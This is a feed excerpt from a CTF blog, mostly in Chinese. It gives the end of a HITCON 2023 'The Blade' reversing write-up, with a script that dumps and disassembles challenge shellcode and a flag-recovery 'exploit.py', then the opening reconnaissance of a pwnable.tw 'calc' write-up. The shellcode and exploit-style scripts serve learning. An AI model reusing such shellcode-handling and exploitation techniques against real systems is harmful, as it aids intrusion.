class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption Map: &quot;</span>, decryption_map)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 3: Parsing the shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disassemble the shellcode bytes for the amd64 architecture</span></span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the disassembled code for review</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Disassembled_code: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># Adds a blank line for better readability</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the shellcode bytes back into a string format for display or other uses</span></span><br><span class="line">shellcode_exe = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> shellcode_bytes])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the shellcode string in a format that&#x27;s ready to be used or analyzed</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode: &quot;</span>, shellcode_exe)</span><br></pre></td></tr></table></figure></div><h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">index_map = [<span class="number">61</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">14</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">43</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">59</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">60</span>, <span class="number">9</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">decrypt_map = &#123;<span class="number">251</span>: <span class="number">0</span>, <span class="number">123</span>: <span class="number">1</span>, <span class="number">78</span>: <span class="number">2</span>, <span class="number">187</span>: <span class="number">3</span>, <span class="number">81</span>: <span class="number">4</span>, <span class="number">21</span>: <span class="number">5</span>, <span class="number">141</span>: <span class="number">6</span>, <span class="number">219</span>: <span class="number">7</span>, <span class="number">176</span>: <span class="number">8</span>, <span class="number">172</span>: <span class="number">9</span>, <span class="number">165</span>: <span class="number">10</span>, <span class="number">142</span>: <span class="number">11</span>, <span class="number">170</span>: <span class="number">12</span>, <span class="number">178</span>: <span class="number">13</span>, <span class="number">96</span>: <span class="number">14</span>, <span class="number">235</span>: <span class="number">15</span>, <span class="number">99</span>: <span class="number">16</span>, <span class="number">92</span>: <span class="number">17</span>, <span class="number">222</span>: <span class="number">18</span>, <span class="number">66</span>: <span class="number">19</span>, <span class="number">43</span>: <span class="number">20</span>, <span class="number">198</span>: <span class="number">21</span>, <span class="number">166</span>: <span class="number">22</span>, <span class="number">53</span>: <span class="number">23</span>, <span class="number">48</span>: <span class="number">24</span>, <span class="number">67</span>: <span class="number">25</span>, <span class="number">214</span>: <span class="number">26</span>, <span class="number">95</span>: <span class="number">27</span>, <span class="number">189</span>: <span class="number">28</span>, <span class="number">36</span>: <span class="number">29</span>, <span class="number">177</span>: <span class="number">30</span>, <span class="number">227</span>: <span class="number">31</span>, <span class="number">140</span>: <span class="number">32</span>, <span class="number">167</span>: <span class="number">33</span>, <span class="number">213</span>: <span class="number">34</span>, <span class="number">42</span>: <span class="number">35</span>, <span class="number">124</span>: <span class="number">36</span>, <span class="number">109</span>: <span class="number">37</span>, <span class="number">139</span>: <span class="number">38</span>, <span class="number">23</span>: <span class="number">39</span>, <span class="number">157</span>: <span class="number">40</span>, <span class="number">131</span>: <span class="number">41</span>, <span class="number">254</span>: <span class="number">42</span>, <span class="number">105</span>: <span class="number">43</span>, <span class="number">16</span>: <span class="number">44</span>, <span class="number">89</span>: <span class="number">45</span>, <span class="number">169</span>: <span class="number">46</span>, <span class="number">158</span>: <span class="number">47</span>, <span class="number">15</span>: <span class="number">48</span>, <span class="number">28</span>: <span class="number">49</span>, <span class="number">102</span>: <span class="number">50</span>, <span class="number">151</span>: <span class="number">51</span>, <span class="number">91</span>: <span class="number">52</span>, <span class="number">97</span>: <span class="number">53</span>, <span class="number">237</span>: <span class="number">54</span>, <span class="number">173</span>: <span class="number">55</span>, <span class="number">224</span>: <span class="number">56</span>, <span class="number">218</span>: <span class="number">57</span>, <span class="number">39</span>: <span class="number">58</span>, <span class="number">6</span>: <span class="number">59</span>, <span class="number">37</span>: <span class="number">60</span>, <span class="number">220</span>: <span class="number">61</span>, <span class="number">94</span>: <span class="number">62</span>, <span class="number">231</span>: <span class="number">63</span>, <span class="number">65</span>: <span class="number">64</span>, <span class="number">50</span>: <span class="number">65</span>, <span class="number">210</span>: <span class="number">66</span>, <span class="number">217</span>: <span class="number">67</span>, <span class="number">143</span>: <span class="number">68</span>, <span class="number">238</span>: <span class="number">69</span>, <span class="number">175</span>: <span class="number">70</span>, <span class="number">3</span>: <span class="number">71</span>, <span class="number">147</span>: <span class="number">72</span>, <span class="number">58</span>: <span class="number">73</span>, <span class="number">0</span>: <span class="number">74</span>, <span class="number">162</span>: <span class="number">75</span>, <span class="number">225</span>: <span class="number">76</span>, <span class="number">179</span>: <span class="number">77</span>, <span class="number">236</span>: <span class="number">78</span>, <span class="number">129</span>: <span class="number">79</span>, <span class="number">159</span>: <span class="number">80</span>, <span class="number">202</span>: <span class="number">81</span>, <span class="number">88</span>: <span class="number">82</span>, <span class="number">183</span>: <span class="number">83</span>, <span class="number">121</span>: <span class="number">84</span>, <span class="number">253</span>: <span class="number">85</span>, <span class="number">59</span>: <span class="number">86</span>, <span class="number">160</span>: <span class="number">87</span>, <span class="number">2</span>: <span class="number">88</span>, <span class="number">12</span>: <span class="number">89</span>, <span class="number">203</span>: <span class="number">90</span>, <span class="number">168</span>: <span class="number">91</span>, <span class="number">128</span>: <span class="number">92</span>, <span class="number">192</span>: <span class="number">93</span>, <span class="number">22</span>: <span class="number">94</span>, <span class="number">77</span>: <span class="number">95</span>, <span class="number">47</span>: <span class="number">96</span>, <span class="number">117</span>: <span class="number">97</span>, <span class="number">113</span>: <span class="number">98</span>, <span class="number">10</span>: <span class="number">99</span>, <span class="number">4</span>: <span class="number">100</span>, <span class="number">57</span>: <span class="number">101</span>, <span class="number">255</span>: <span class="number">102</span>, <span class="number">193</span>: <span class="number">103</span>, <span class="number">156</span>: <span class="number">104</span>, <span class="number">171</span>: <span class="number">105</span>, <span class="number">239</span>: <span class="number">106</span>, <span class="number">164</span>: <span class="number">107</span>, <span class="number">216</span>: <span class="number">108</span>, <span class="number">226</span>: <span class="number">109</span>, <span class="number">20</span>: <span class="number">110</span>, <span class="number">194</span>: <span class="number">111</span>, <span class="number">108</span>: <span class="number">112</span>, <span class="number">100</span>: <span class="number">113</span>, <span class="number">30</span>: <span class="number">114</span>, <span class="number">107</span>: <span class="number">115</span>, <span class="number">126</span>: <span class="number">116</span>, <span class="number">153</span>: <span class="number">117</span>, <span class="number">46</span>: <span class="number">118</span>, <span class="number">9</span>: <span class="number">119</span>, <span class="number">11</span>: <span class="number">120</span>, <span class="number">134</span>: <span class="number">121</span>, <span class="number">116</span>: <span class="number">122</span>, <span class="number">106</span>: <span class="number">123</span>, <span class="number">196</span>: <span class="number">124</span>, <span class="number">45</span>: <span class="number">125</span>, <span class="number">79</span>: <span class="number">126</span>, <span class="number">249</span>: <span class="number">127</span>, <span class="number">250</span>: <span class="number">128</span>, <span class="number">148</span>: <span class="number">129</span>, <span class="number">182</span>: <span class="number">130</span>, <span class="number">31</span>: <span class="number">131</span>, <span class="number">137</span>: <span class="number">132</span>, <span class="number">111</span>: <span class="number">133</span>, <span class="number">93</span>: <span class="number">134</span>, <span class="number">232</span>: <span class="number">135</span>, <span class="number">234</span>: <span class="number">136</span>, <span class="number">181</span>: <span class="number">137</span>, <span class="number">90</span>: <span class="number">138</span>, <span class="number">101</span>: <span class="number">139</span>, <span class="number">136</span>: <span class="number">140</span>, <span class="number">197</span>: <span class="number">141</span>, <span class="number">127</span>: <span class="number">142</span>, <span class="number">119</span>: <span class="number">143</span>, <span class="number">17</span>: <span class="number">144</span>, <span class="number">207</span>: <span class="number">145</span>, <span class="number">241</span>: <span class="number">146</span>, <span class="number">27</span>: <span class="number">147</span>, <span class="number">63</span>: <span class="number">148</span>, <span class="number">244</span>: <span class="number">149</span>, <span class="number">72</span>: <span class="number">150</span>, <span class="number">71</span>: <span class="number">151</span>, <span class="number">18</span>: <span class="number">152</span>, <span class="number">228</span>: <span class="number">153</span>, <span class="number">186</span>: <span class="number">154</span>, <span class="number">223</span>: <span class="number">155</span>, <span class="number">233</span>: <span class="number">156</span>, <span class="number">98</span>: <span class="number">157</span>, <span class="number">110</span>: <span class="number">158</span>, <span class="number">180</span>: <span class="number">159</span>, <span class="number">150</span>: <span class="number">160</span>, <span class="number">205</span>: <span class="number">161</span>, <span class="number">19</span>: <span class="number">162</span>, <span class="number">83</span>: <span class="number">163</span>, <span class="number">75</span>: <span class="number">164</span>, <span class="number">40</span>: <span class="number">165</span>, <span class="number">215</span>: <span class="number">166</span>, <span class="number">209</span>: <span class="number">167</span>, <span class="number">51</span>: <span class="number">168</span>, <span class="number">184</span>: <span class="number">169</span>, <span class="number">230</span>: <span class="number">170</span>, <span class="number">122</span>: <span class="number">171</span>, <span class="number">44</span>: <span class="number">172</span>, <span class="number">155</span>: <span class="number">173</span>, <span class="number">41</span>: <span class="number">174</span>, <span class="number">68</span>: <span class="number">175</span>, <span class="number">82</span>: <span class="number">176</span>, <span class="number">247</span>: <span class="number">177</span>, <span class="number">32</span>: <span class="number">178</span>, <span class="number">242</span>: <span class="number">179</span>, <span class="number">49</span>: <span class="number">180</span>, <span class="number">211</span>: <span class="number">181</span>, <span class="number">185</span>: <span class="number">182</span>, <span class="number">64</span>: <span class="number">183</span>, <span class="number">208</span>: <span class="number">184</span>, <span class="number">52</span>: <span class="number">185</span>, <span class="number">245</span>: <span class="number">186</span>, <span class="number">84</span>: <span class="number">187</span>, <span class="number">26</span>: <span class="number">188</span>, <span class="number">1</span>: <span class="number">189</span>, <span class="number">161</span>: <span class="number">190</span>, <span class="number">146</span>: <span class="number">191</span>, <span class="number">252</span>: <span class="number">192</span>, <span class="number">133</span>: <span class="number">193</span>, <span class="number">7</span>: <span class="number">194</span>, <span class="number">190</span>: <span class="number">195</span>, <span class="number">221</span>: <span class="number">196</span>, <span class="number">188</span>: <span class="number">197</span>, <span class="number">25</span>: <span class="number">198</span>, <span class="number">243</span>: <span class="number">199</span>, <span class="number">54</span>: <span class="number">200</span>, <span class="number">246</span>: <span class="number">201</span>, <span class="number">114</span>: <span class="number">202</span>, <span class="number">152</span>: <span class="number">203</span>, <span class="number">76</span>: <span class="number">204</span>, <span class="number">125</span>: <span class="number">205</span>, <span class="number">199</span>: <span class="number">206</span>, <span class="number">212</span>: <span class="number">207</span>, <span class="number">69</span>: <span class="number">208</span>, <span class="number">74</span>: <span class="number">209</span>, <span class="number">154</span>: <span class="number">210</span>, <span class="number">195</span>: <span class="number">211</span>, <span class="number">138</span>: <span class="number">212</span>, <span class="number">229</span>: <span class="number">213</span>, <span class="number">80</span>: <span class="number">214</span>, <span class="number">70</span>: <span class="number">215</span>, <span class="number">204</span>: <span class="number">216</span>, <span class="number">104</span>: <span class="number">217</span>, <span class="number">118</span>: <span class="number">218</span>, <span class="number">103</span>: <span class="number">219</span>, <span class="number">201</span>: <span class="number">220</span>, <span class="number">14</span>: <span class="number">221</span>, <span class="number">60</span>: <span class="number">222</span>, <span class="number">87</span>: <span class="number">223</span>, <span class="number">240</span>: <span class="number">224</span>, <span class="number">34</span>: <span class="number">225</span>, <span class="number">191</span>: <span class="number">226</span>, <span class="number">38</span>: <span class="number">227</span>, <span class="number">132</span>: <span class="number">228</span>, <span class="number">13</span>: <span class="number">229</span>, <span class="number">144</span>: <span class="number">230</span>, <span class="number">163</span>: <span class="number">231</span>, <span class="number">174</span>: <span class="number">232</span>, <span class="number">61</span>: <span class="number">233</span>, <span class="number">29</span>: <span class="number">234</span>, <span class="number">200</span>: <span class="number">235</span>, <span class="number">145</span>: <span class="number">236</span>, <span class="number">5</span>: <span class="number">237</span>, <span class="number">135</span>: <span class="number">238</span>, <span class="number">112</span>: <span class="number">239</span>, <span class="number">8</span>: <span class="number">240</span>, <span class="number">115</span>: <span class="number">241</span>, <span class="number">33</span>: <span class="number">242</span>, <span class="number">73</span>: <span class="number">243</span>, <span class="number">85</span>: <span class="number">244</span>, <span class="number">62</span>: <span class="number">245</span>, <span class="number">55</span>: <span class="number">246</span>, <span class="number">35</span>: <span class="number">247</span>, <span class="number">24</span>: <span class="number">248</span>, <span class="number">86</span>: <span class="number">249</span>, <span class="number">206</span>: <span class="number">250</span>, <span class="number">130</span>: <span class="number">251</span>, <span class="number">56</span>: <span class="number">252</span>, <span class="number">149</span>: <span class="number">253</span>, <span class="number">120</span>: <span class="number">254</span>, <span class="number">248</span>: <span class="number">255</span>&#125;</span><br><span class="line"></span><br><span class="line">const_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_cal</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> const_data:</span><br><span class="line">    flag_list.extend(reverse_cal(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag_list = [decrypt_map[i] <span class="keyword">for</span> i <span class="keyword">in</span> flag_list]</span><br><span class="line">    flag_list = [flag_list[index_map[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag_list)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><ul><li>flag:<br><code>hitcon&#123;&lt;https://soundcloud.com/monstercat/noisestorm-crab-rave&gt;&#125;</code><br>flag 是一串網址，感覺有點像是迷因 XD，有興趣可以去聽看看～</li></ul><h2 id="0x5-Summary"><a href="#0x5-Summary" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h2><p>解這題和寫 writeup 其實花了不少時間，以下是一些心得和學到的教訓： </p><ul><li><p>找指令的不同思路：<br>這題在分析的思路上算是蠻線性的，基本上要分析的也只有 <code>verify()</code> 跟一點點 <code>prompt()</code>，不過看到有其他高手用 <code>strings</code> 直接找到 flag-checker 的指令很不可思議，下次也會從這邊切入嘗試，也許能省下不少時間。</p></li><li><p>型別轉換：<br>在建映射表還有寫 exploit 的時候，型別轉換都蠻困擾我的，往往是執行後才發現有問題，也吃了一點時間在 debug，不過這就是經驗不足，講出來就是要再扁自己一次，熟悉後寫 script 的效率想必也會提升不少，就更有機會在時間內解出這種麻煩的題目了。</p></li><li><p>敗筆：<br><code>verify()</code> 前面處理 input 的部分從靜態分析都能夠大概看出來，但後面寫入 255 bytes 的 shellcode 沒有意識到，雖然有發現寫入了一些 bytes 但沒有轉成 assembly 就很難猜到他後面在幹嘛，不過有經驗後下次就會把這個可能考慮進去，解出來後面就蠻順利了。</p></li><li><p>發現好用的新工具：<br>在建立加密映射表的時候覺得輸入的重複性很高，就查了一下 GDB 有 python API 可以用，未來感覺也可以應用在不少場境。</p></li><li><p>更頻繁地使用動態分析：<br>我發現自己寫逆向題的時候用動態分析的比例都明顯下降了不少，但動態分析有時候真的會省下不少麻煩，有些情況下甚至是必要的，尤其像是 Rust 的題目更是如此，未來也會更頻繁的搭配動態分析去增加自己逆向的效率。</p></li><li><p>練習的方向：<br>這次也有發現寫 HITCON CTF 的題目雖然花時間，但確實會學到不少東西，近期也開始有在寫 pwnable.tw 的題目，希望能透過難題逼自己脫離舒適圈，然後成長得更快。</p></li></ul><h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p><a class="link"   href="https://trebledj.me/posts/hitcon-2023-the-blade/" >HITCON 2023 – The Blade <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/Sky_WF/article/details/132796329" >hitcon2023逆向 The Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://hexrotor.github.io/2023/09/10/hitcon-2023-blade-wp/" >Hitcon 2023 Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HITCON-CTF-2023-Full-Chain-The-Blade&quot;&gt;&lt;a href=&quot;#HITCON-CTF-2023-Full-Chain-The-Blade&quot; class=&quot;headerlink&quot; title=&quot;HITCON-CTF-2023 - Fu</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="reverse" scheme="https://kazma.tw/tags/reverse/"/>
    
    <category term="hitconctf" scheme="https://kazma.tw/tags/hitconctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw calc Writeup</title>
    <link href="https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/"/>
    <id>https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/</id>
    <published>2024-02-11T14:59:16.000Z</published>
    <updated>2024-04-19T06:35:38.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-calc"><a href="#Pwnable-tw-calc" class="headerlink" title="Pwnable.tw - calc"></a>Pwnable.tw - calc</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Have you ever use Microsoft calculator?</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#3" >https://pwnable.tw/challenge/#3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>題目如名是一個計算機，跟前面一樣都是 x86 的 binary，然後是 statically linked，又 NX 有開，可能高機率會利用到 rop，這邊有個印象就好，執行的部分有發現一些不尋常的輸出，稍後可以來分析這些 case。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./calc</span><br><span class="line">./calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./calc</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/calc/calc&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div><h3 id="calc"><a href="#calc" class="headerlink" title=".&#x2F;calc"></a>.&#x2F;calc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+1</span><br><span class="line">2</span><br><span class="line">1/0</span><br><span class="line">prevent division by zero</span><br><span class="line">1+0</span><br><span class="line">prevent division by zero</span><br><span class="line">-50+50</span><br><span class="line">43</span><br><span class="line">+100+100</span><br><span class="line">100</span><br><span class="line">No time to waste!</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>用 ida 反編譯並且整理過後，我們大致可以理解程式的行為如下：</p><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">ssignal</span>(<span class="number">14</span>, timeout);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">60</span>);</span><br><span class="line">  <span 